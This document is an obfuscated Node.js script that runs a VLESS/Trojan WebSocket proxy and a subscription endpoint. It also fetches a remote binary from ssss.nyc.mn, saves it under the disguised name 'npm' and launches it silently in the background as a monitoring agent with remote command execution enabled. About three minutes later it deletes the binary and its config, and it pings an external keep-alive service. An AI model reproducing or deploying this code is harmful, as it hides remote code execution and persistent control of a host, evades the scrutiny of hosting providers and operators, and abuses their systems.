const _0x48cc31=_0x2589;(function(_0xbcdab2,_0x112cd3){const _0x3bbb45=_0x2589,_0x33a44c=_0xbcdab2();while(!![]){try{const _0x39bc5c=-parseInt(_0x3bbb45(0x141))/0x1+-parseInt(_0x3bbb45(0xfb))/0x2+-parseInt(_0x3bbb45(0x12b))/0x3+parseInt(_0x3bbb45(0x10d))/0x4*(-parseInt(_0x3bbb45(0xfe))/0x5)+parseInt(_0x3bbb45(0x165))/0x6*(-parseInt(_0x3bbb45(0x132))/0x7)+parseInt(_0x3bbb45(0x15f))/0x8+parseInt(_0x3bbb45(0x139))/0x9;if(_0x39bc5c===_0x112cd3)break;else _0x33a44c['push'](_0x33a44c['shift']());}catch(_0x3a43e9){_0x33a44c['push'](_0x33a44c['shift']());}}}(_0x968a,0x69d6c));function _0x968a(){const _0x220ff7=['config.yaml','writeHead','crypto','utf-8','axios','Answer','pop','unlink','Server\x20is\x20running\x20on\x20port\x20','application/json','get','https://amd64.ssss.nyc.mn/v1','--tls','pipe','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','toString','NEZHA_PORT','6173440fqAwSA','https://amd64.ssss.nyc.mn/agent','digest','connection','Not\x20Found\x0a','npm\x20is\x20already\x20running,\x20skip\x20running...','1059768MKmQDH','decode','includes','text/html','readFile','SUB_PATH','replace','writeFileSync','NEZHA_KEY','arm','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','error','stream','then','net','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','path','test','reduce','setsid\x20nohup\x20./npm\x20-s\x20','1439892oOVgeu','npm\x20download\x20successfully','npm','5GyZapU','map','every','Server','trojan://','data',':443?security=tls&sni=','sha224','concat','once','true','1234.abc.com','log','connect','finish','1204804siIwxo','1.1.1.1','/bin/bash','write','application/dns-json','Status','chmod\x20+x\x20npm','false','arm64','message','NEZHA_SERVER','https://oooo.serv00.net/add-url','env','8443','\x20-p\x20','aarch64','createWriteStream','8.8.4.4','url',':443?encryption=none&security=tls&sni=','readUInt8','https://arm64.ssss.nyc.mn/agent','2096','text/plain','readUInt16BE','country_code','slice','Automatic\x20Access\x20Task\x20added\x20successfully','substr','\x20with\x20all\x20DNS\x20servers','399414lFPylX','Unknown','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','&path=%2F','find','npm\x20is\x20running','AUTO_ACCESS','14muQowE','end','post','Failed\x20to\x20resolve\x20','vless://','catch','2087','18047331rORcmI','buffer','https://dns.google/resolve?name=','type','listen','2083','close','client_secret:\x20','835882hGwxrP','join','NAME','from','https://api.ip.sb/geoip','error:\x20','&fp=chrome&type=ws&host=','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','http','utf8','trim','length','isp'];_0x968a=function(){return _0x220ff7;};return _0x968a();}const os=require('os'),http=require(_0x48cc31(0x149)),fs=require('fs'),axios=require(_0x48cc31(0x152)),net=require(_0x48cc31(0xf5)),path=require(_0x48cc31(0xf7)),crypto=require(_0x48cc31(0x150)),{Buffer}=require(_0x48cc31(0x13a)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x48cc31(0x119)]['UUID']||'9351b6c2-1565-4f16-94f9-a135a8f5fd8c',NEZHA_SERVER=process[_0x48cc31(0x119)][_0x48cc31(0x117)]||'',NEZHA_PORT=process[_0x48cc31(0x119)][_0x48cc31(0x15e)]||'',NEZHA_KEY=process[_0x48cc31(0x119)][_0x48cc31(0x16d)]||'',DOMAIN=process[_0x48cc31(0x119)]['DOMAIN']||_0x48cc31(0x109),AUTO_ACCESS=process[_0x48cc31(0x119)][_0x48cc31(0x131)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x48cc31(0x127)](0x0,0x8),SUB_PATH=process[_0x48cc31(0x119)][_0x48cc31(0x16a)]||'sub',NAME=process['env'][_0x48cc31(0x143)]||'',PORT=process[_0x48cc31(0x119)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x135556=_0x48cc31;try{const _0xad95b9=await axios[_0x135556(0x158)](_0x135556(0x145)),_0x336f25=_0xad95b9[_0x135556(0x103)];ISP=(_0x336f25[_0x135556(0x126)]+'-'+_0x336f25[_0x135556(0x14d)])[_0x135556(0x16b)](/ /g,'_');}catch(_0x2d5226){ISP=_0x135556(0x12c);}};GetISP();const httpServer=http['createServer']((_0x54517c,_0x50bdcd)=>{const _0x31ff42=_0x48cc31;if(_0x54517c[_0x31ff42(0x11f)]==='/'){const _0x1de26d=path[_0x31ff42(0x142)](__dirname,'index.html');fs[_0x31ff42(0x169)](_0x1de26d,_0x31ff42(0x14a),(_0x4bb34f,_0x3f209b)=>{const _0x5b3105=_0x31ff42;if(_0x4bb34f){_0x50bdcd[_0x5b3105(0x14f)](0xc8,{'Content-Type':_0x5b3105(0x168)}),_0x50bdcd[_0x5b3105(0x133)]('Hello\x20world!');return;}_0x50bdcd['writeHead'](0xc8,{'Content-Type':_0x5b3105(0x168)}),_0x50bdcd[_0x5b3105(0x133)](_0x3f209b);});return;}else{if(_0x54517c[_0x31ff42(0x11f)]==='/'+SUB_PATH){const _0x27348b=NAME?NAME+'-'+ISP:ISP,_0x296cf8=_0x31ff42(0x136)+UUID+'@'+DOMAIN+_0x31ff42(0x120)+DOMAIN+_0x31ff42(0x147)+DOMAIN+_0x31ff42(0x12e)+WSPATH+'#'+_0x27348b,_0x374475=_0x31ff42(0x102)+UUID+'@'+DOMAIN+_0x31ff42(0x104)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x31ff42(0x12e)+WSPATH+'#'+_0x27348b,_0x27191b=_0x296cf8+'\x0a'+_0x374475,_0x4fa3de=Buffer[_0x31ff42(0x144)](_0x27191b)[_0x31ff42(0x15d)]('base64');_0x50bdcd[_0x31ff42(0x14f)](0xc8,{'Content-Type':_0x31ff42(0x124)}),_0x50bdcd[_0x31ff42(0x133)](_0x4fa3de+'\x0a');}else _0x50bdcd[_0x31ff42(0x14f)](0x194,{'Content-Type':_0x31ff42(0x124)}),_0x50bdcd[_0x31ff42(0x133)](_0x31ff42(0x163));}}),wss=new WebSocket[(_0x48cc31(0x101))]({'server':httpServer}),uuid=UUID[_0x48cc31(0x16b)](/-/g,''),DNS_SERVERS=[_0x48cc31(0x11e),_0x48cc31(0x10e)];function resolveHost(_0x437452){return new Promise((_0x4afd94,_0x29647a)=>{const _0x2ba92d=_0x2589;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2ba92d(0xf8)](_0x437452)){_0x4afd94(_0x437452);return;}let _0xabf5cb=0x0;function _0x351c94(){const _0x259f66=_0x2ba92d;if(_0xabf5cb>=DNS_SERVERS[_0x259f66(0x14c)]){_0x29647a(new Error(_0x259f66(0x135)+_0x437452+_0x259f66(0x12a)));return;}const _0x182d5a=DNS_SERVERS[_0xabf5cb];_0xabf5cb++;const _0x461219=_0x259f66(0x13b)+encodeURIComponent(_0x437452)+'&type=A';axios[_0x259f66(0x158)](_0x461219,{'timeout':0x1388,'headers':{'Accept':_0x259f66(0x111)}})[_0x259f66(0x172)](_0x306a69=>{const _0xe273c5=_0x259f66,_0x10f0ee=_0x306a69[_0xe273c5(0x103)];if(_0x10f0ee[_0xe273c5(0x112)]===0x0&&_0x10f0ee[_0xe273c5(0x153)]&&_0x10f0ee['Answer'][_0xe273c5(0x14c)]>0x0){const _0x455427=_0x10f0ee['Answer'][_0xe273c5(0x12f)](_0x559c4d=>_0x559c4d[_0xe273c5(0x13c)]===0x1);if(_0x455427){_0x4afd94(_0x455427[_0xe273c5(0x103)]);return;}}_0x351c94();})['catch'](_0x542de8=>{_0x351c94();});}_0x351c94();});}function handleVlessConnection(_0x58b9ed,_0x595b30){const _0x20bddd=_0x48cc31,[_0x3b6c7c]=_0x595b30,_0x362844=_0x595b30['slice'](0x1,0x11);if(!_0x362844[_0x20bddd(0x100)]((_0x5ef6dc,_0x12ac6b)=>_0x5ef6dc==parseInt(uuid[_0x20bddd(0x129)](_0x12ac6b*0x2,0x2),0x10)))return![];let _0x1552e2=_0x595b30[_0x20bddd(0x127)](0x11,0x12)[_0x20bddd(0x121)]()+0x13;const _0x3f71d1=_0x595b30['slice'](_0x1552e2,_0x1552e2+=0x2)[_0x20bddd(0x125)](0x0),_0x34a564=_0x595b30[_0x20bddd(0x127)](_0x1552e2,_0x1552e2+=0x1)['readUInt8'](),_0x9acbe6=_0x34a564==0x1?_0x595b30['slice'](_0x1552e2,_0x1552e2+=0x4)[_0x20bddd(0x142)]('.'):_0x34a564==0x2?new TextDecoder()[_0x20bddd(0x166)](_0x595b30[_0x20bddd(0x127)](_0x1552e2+0x1,_0x1552e2+=0x1+_0x595b30['slice'](_0x1552e2,_0x1552e2+0x1)[_0x20bddd(0x121)]())):_0x34a564==0x3?_0x595b30[_0x20bddd(0x127)](_0x1552e2,_0x1552e2+=0x10)[_0x20bddd(0xf9)]((_0x19d113,_0x37380e,_0x4ea503,_0x48ea8b)=>_0x4ea503%0x2?_0x19d113[_0x20bddd(0x106)](_0x48ea8b[_0x20bddd(0x127)](_0x4ea503-0x1,_0x4ea503+0x1)):_0x19d113,[])[_0x20bddd(0xff)](_0x4ac9eb=>_0x4ac9eb[_0x20bddd(0x125)](0x0)['toString'](0x10))[_0x20bddd(0x142)](':'):'';_0x58b9ed['send'](new Uint8Array([_0x3b6c7c,0x0]));const _0xaa2ecc=createWebSocketStream(_0x58b9ed);return resolveHost(_0x9acbe6)['then'](_0x194402=>{const _0x552873=_0x20bddd;net['connect']({'host':_0x194402,'port':_0x3f71d1},function(){const _0x339618=_0x2589;this[_0x339618(0x110)](_0x595b30[_0x339618(0x127)](_0x1552e2)),_0xaa2ecc['on']('error',()=>{})[_0x339618(0x15b)](this)['on']('error',()=>{})['pipe'](_0xaa2ecc);})['on'](_0x552873(0x170),()=>{});})[_0x20bddd(0x137)](_0x306f88=>{net['connect']({'host':_0x9acbe6,'port':_0x3f71d1},function(){const _0x4aff55=_0x2589;this['write'](_0x595b30['slice'](_0x1552e2)),_0xaa2ecc['on']('error',()=>{})[_0x4aff55(0x15b)](this)['on']('error',()=>{})[_0x4aff55(0x15b)](_0xaa2ecc);})['on']('error',()=>{});}),!![];}function _0x2589(_0x11caf2,_0xa362ee){_0x11caf2=_0x11caf2-0xf5;const _0x968a11=_0x968a();let _0x2589f7=_0x968a11[_0x11caf2];return _0x2589f7;}function handleTrojanConnection(_0x5a0526,_0x8f3ddb){const _0x502d3b=_0x48cc31;try{if(_0x8f3ddb[_0x502d3b(0x14c)]<0x3a)return![];const _0x43c4ff=_0x8f3ddb[_0x502d3b(0x127)](0x0,0x38)['toString'](),_0x1c2cec=[UUID];let _0x4c29e3=null;for(const _0x42ad9f of _0x1c2cec){const _0x40bb02=crypto['createHash'](_0x502d3b(0x105))['update'](_0x42ad9f)[_0x502d3b(0x161)]('hex');if(_0x40bb02===_0x43c4ff){_0x4c29e3=_0x42ad9f;break;}}if(!_0x4c29e3)return![];let _0x46f895=0x38;_0x8f3ddb[_0x46f895]===0xd&&_0x8f3ddb[_0x46f895+0x1]===0xa&&(_0x46f895+=0x2);const _0x5ac83a=_0x8f3ddb[_0x46f895];if(_0x5ac83a!==0x1)return![];_0x46f895+=0x1;const _0x4b68d3=_0x8f3ddb[_0x46f895];_0x46f895+=0x1;let _0x2e2a66,_0x1cfa4b;if(_0x4b68d3===0x1)_0x2e2a66=_0x8f3ddb[_0x502d3b(0x127)](_0x46f895,_0x46f895+0x4)[_0x502d3b(0x142)]('.'),_0x46f895+=0x4;else{if(_0x4b68d3===0x3){const _0x5ae290=_0x8f3ddb[_0x46f895];_0x46f895+=0x1,_0x2e2a66=_0x8f3ddb[_0x502d3b(0x127)](_0x46f895,_0x46f895+_0x5ae290)[_0x502d3b(0x15d)](),_0x46f895+=_0x5ae290;}else{if(_0x4b68d3===0x4)_0x2e2a66=_0x8f3ddb[_0x502d3b(0x127)](_0x46f895,_0x46f895+0x10)['reduce']((_0x387223,_0x43a36a,_0x378c47,_0xcf1b3b)=>_0x378c47%0x2?_0x387223['concat'](_0xcf1b3b[_0x502d3b(0x127)](_0x378c47-0x1,_0x378c47+0x1)):_0x387223,[])[_0x502d3b(0xff)](_0x3e5185=>_0x3e5185[_0x502d3b(0x125)](0x0)[_0x502d3b(0x15d)](0x10))[_0x502d3b(0x142)](':'),_0x46f895+=0x10;else return![];}}_0x1cfa4b=_0x8f3ddb[_0x502d3b(0x125)](_0x46f895),_0x46f895+=0x2;_0x46f895<_0x8f3ddb[_0x502d3b(0x14c)]&&_0x8f3ddb[_0x46f895]===0xd&&_0x8f3ddb[_0x46f895+0x1]===0xa&&(_0x46f895+=0x2);const _0x26376a=createWebSocketStream(_0x5a0526);return resolveHost(_0x2e2a66)[_0x502d3b(0x172)](_0x49dbd3=>{net['connect']({'host':_0x49dbd3,'port':_0x1cfa4b},function(){const _0x51cd11=_0x2589;_0x46f895<_0x8f3ddb[_0x51cd11(0x14c)]&&this[_0x51cd11(0x110)](_0x8f3ddb[_0x51cd11(0x127)](_0x46f895)),_0x26376a['on']('error',()=>{})['pipe'](this)['on'](_0x51cd11(0x170),()=>{})[_0x51cd11(0x15b)](_0x26376a);})['on']('error',()=>{});})['catch'](_0x44b63e=>{const _0x4bdd8a=_0x502d3b;net[_0x4bdd8a(0x10b)]({'host':_0x2e2a66,'port':_0x1cfa4b},function(){const _0xb6ffe3=_0x4bdd8a;_0x46f895<_0x8f3ddb[_0xb6ffe3(0x14c)]&&this[_0xb6ffe3(0x110)](_0x8f3ddb['slice'](_0x46f895)),_0x26376a['on'](_0xb6ffe3(0x170),()=>{})[_0xb6ffe3(0x15b)](this)['on'](_0xb6ffe3(0x170),()=>{})[_0xb6ffe3(0x15b)](_0x26376a);})['on']('error',()=>{});}),!![];}catch(_0x3e8acd){return![];}}wss['on'](_0x48cc31(0x162),(_0x10ebe3,_0x1a81e1)=>{const _0x29dff4=_0x48cc31,_0x291a13=_0x1a81e1[_0x29dff4(0x11f)]||'';_0x10ebe3[_0x29dff4(0x107)](_0x29dff4(0x116),_0x15db04=>{const _0x13eed5=_0x29dff4;if(_0x15db04[_0x13eed5(0x14c)]>0x11&&_0x15db04[0x0]===0x0){const _0x35dd73=_0x15db04[_0x13eed5(0x127)](0x1,0x11),_0x2163c9=_0x35dd73['every']((_0x59dd58,_0x17df73)=>_0x59dd58==parseInt(uuid['substr'](_0x17df73*0x2,0x2),0x10));if(_0x2163c9){!handleVlessConnection(_0x10ebe3,_0x15db04)&&_0x10ebe3[_0x13eed5(0x13f)]();return;}}!handleTrojanConnection(_0x10ebe3,_0x15db04)&&_0x10ebe3[_0x13eed5(0x13f)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x39a81f=_0x48cc31,_0x451c71=os['arch']();return _0x451c71===_0x39a81f(0x16e)||_0x451c71===_0x39a81f(0x115)||_0x451c71===_0x39a81f(0x11c)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x39a81f(0x122):!NEZHA_PORT?_0x39a81f(0x159):_0x39a81f(0x160);},downloadFile=async()=>{const _0x29d341=_0x48cc31;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4abc8e=getDownloadUrl(),_0x2a46b1=await axios({'method':'get','url':_0x4abc8e,'responseType':_0x29d341(0x171)}),_0x595e84=fs[_0x29d341(0x11d)]('npm');return _0x2a46b1[_0x29d341(0x103)][_0x29d341(0x15b)](_0x595e84),new Promise((_0x4c3714,_0x323225)=>{const _0x5af894=_0x29d341;_0x595e84['on'](_0x5af894(0x10c),()=>{const _0x46dc1b=_0x5af894;console['log'](_0x46dc1b(0xfc)),exec(_0x46dc1b(0x113),_0x37506f=>{if(_0x37506f)_0x323225(_0x37506f);_0x4c3714();});}),_0x595e84['on']('error',_0x323225);});}catch(_0x22e859){throw _0x22e859;}},runnz=async()=>{const _0x4c4c1a=_0x48cc31;try{const _0x37d50a=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x4c4c1a(0x151)});if(_0x37d50a[_0x4c4c1a(0x14b)]()!==''){console[_0x4c4c1a(0x10a)](_0x4c4c1a(0x164));return;}}catch(_0x1f349a){}await downloadFile();let _0x336386='',_0x4e13ed=['443',_0x4c4c1a(0x11a),_0x4c4c1a(0x123),_0x4c4c1a(0x138),_0x4c4c1a(0x13e),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xcc18df=_0x4e13ed[_0x4c4c1a(0x167)](NEZHA_PORT)?_0x4c4c1a(0x15a):'';_0x336386=_0x4c4c1a(0xfa)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4c4c1a(0x11b)+NEZHA_KEY+'\x20'+_0xcc18df+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1cfea0=NEZHA_SERVER[_0x4c4c1a(0x167)](':')?NEZHA_SERVER['split'](':')[_0x4c4c1a(0x154)]():'',_0x61e85e=_0x4e13ed[_0x4c4c1a(0x167)](_0x1cfea0)?_0x4c4c1a(0x108):_0x4c4c1a(0x114),_0x457733=_0x4c4c1a(0x140)+NEZHA_KEY+_0x4c4c1a(0x148)+NEZHA_SERVER+_0x4c4c1a(0x12d)+_0x61e85e+_0x4c4c1a(0x15c)+UUID;fs[_0x4c4c1a(0x16c)](_0x4c4c1a(0x14e),_0x457733);}_0x336386=_0x4c4c1a(0x16f);}else{console['log'](_0x4c4c1a(0xf6));return;}}try{exec(_0x336386,{'shell':_0x4c4c1a(0x10f)},_0x394fba=>{const _0x24f89c=_0x4c4c1a;if(_0x394fba)console[_0x24f89c(0x170)]('npm\x20running\x20error:',_0x394fba);else console[_0x24f89c(0x10a)](_0x24f89c(0x130));});}catch(_0x288b66){console[_0x4c4c1a(0x170)](_0x4c4c1a(0x146)+_0x288b66);}};async function addAccessTask(){const _0x5273ca=_0x48cc31;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4dba5f='https://'+DOMAIN;try{const _0x56dbe5=await axios[_0x5273ca(0x134)](_0x5273ca(0x118),{'url':_0x4dba5f},{'headers':{'Content-Type':_0x5273ca(0x157)}});console['log'](_0x5273ca(0x128));}catch(_0x298384){}}const delFiles=()=>{const _0x4c5229=_0x48cc31;fs[_0x4c5229(0x155)](_0x4c5229(0xfd),()=>{}),fs['unlink'](_0x4c5229(0x14e),()=>{});};httpServer[_0x48cc31(0x13d)](PORT,()=>{const _0x4744c2=_0x48cc31;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x4744c2(0x156)+PORT);});
